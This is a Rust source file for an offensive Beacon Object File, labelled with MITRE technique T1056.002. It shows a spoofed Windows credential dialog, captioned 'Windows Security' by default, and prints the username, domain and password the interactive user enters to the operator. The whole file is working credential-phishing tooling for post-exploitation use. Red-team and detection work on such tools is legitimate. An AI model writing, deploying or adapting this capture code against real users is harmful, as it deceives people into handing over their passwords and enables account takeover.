//! # Ask Credentials BOF
//!
//! Displays the native Windows credential dialog and returns the username,
//! domain, and password entered by the interactive user. The dialog does not
//! persist the submitted credential.
//!
//! ## MITRE ATT&CK
//! - T1056.002 - Input Capture: GUI Input Capture
//!
//! ## Arguments
//! - `str`: Dialog caption.
//! - `str`: Dialog message.

#![no_std]

use alloc::string::String;
use alloc::vec;
use rustbof::data::DataParser;
use rustbof::str::to_wide;
use rustbof::{eprintln, println};
use windows_sys::Win32::Security::Credentials::{
    CREDUI_FLAGS_ALWAYS_SHOW_UI, CREDUI_FLAGS_DO_NOT_PERSIST, CREDUI_FLAGS_GENERIC_CREDENTIALS,
    CREDUI_INFOW, CredUIPromptForCredentialsW,
};

const ERROR_CANCELLED: u32 = 1223;
const MAX_USERNAME: usize = 513;
const MAX_PASSWORD: usize = 256;

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);
    let caption = String::from(parser.get_str());
    let message = String::from(parser.get_str());
    let caption = if caption.is_empty() {
        String::from("Windows Security")
    } else {
        caption
    };
    let message = if message.is_empty() {
        String::from("Enter your credentials to continue.")
    } else {
        message
    };
    if caption.len() > 256 || message.len() > 1024 {
        eprintln!("[-] Caption or message is too long.");
        return;
    }

    let caption = to_wide(&caption);
    let message = to_wide(&message);
    let mut username = vec![0u16; MAX_USERNAME];
    let mut password = vec![0u16; MAX_PASSWORD];
    let mut save = 0;
    let info = CREDUI_INFOW {
        cbSize: core::mem::size_of::<CREDUI_INFOW>() as u32,
        hwndParent: core::ptr::null_mut(),
        pszMessageText: message.as_ptr(),
        pszCaptionText: caption.as_ptr(),
        hbmBanner: core::ptr::null_mut(),
    };
    let result = unsafe {
        CredUIPromptForCredentialsW(
            &info,
            core::ptr::null(),
            core::ptr::null(),
            0,
            username.as_mut_ptr(),
            username.len() as u32,
            password.as_mut_ptr(),
            password.len() as u32,
            &mut save,
            CREDUI_FLAGS_ALWAYS_SHOW_UI
                | CREDUI_FLAGS_DO_NOT_PERSIST
                | CREDUI_FLAGS_GENERIC_CREDENTIALS,
        )
    };
    if result == ERROR_CANCELLED {
        println!("[*] Credential dialog cancelled.");
        return;
    }
    if result != 0 {
        eprintln!("[-] Credential dialog failed: {}", result);
        return;
    }

    let username_len = username
        .iter()
        .position(|value| *value == 0)
        .unwrap_or(username.len());
    let password_len = password
        .iter()
        .position(|value| *value == 0)
        .unwrap_or(password.len());
    let identity = String::from_utf16_lossy(&username[..username_len]);
    let mut secret = String::from_utf16_lossy(&password[..password_len]);
    password.fill(0);

    let (domain, user) = identity
        .split_once('\\')
        .map_or(("", identity.as_str()), |(domain, user)| (domain, user));
    println!("[+] Username: {}", user);
    println!("[+] Domain:   {}", domain);
    println!("[+] Password: {}", secret);

    unsafe { secret.as_mut_vec().fill(0) };
}
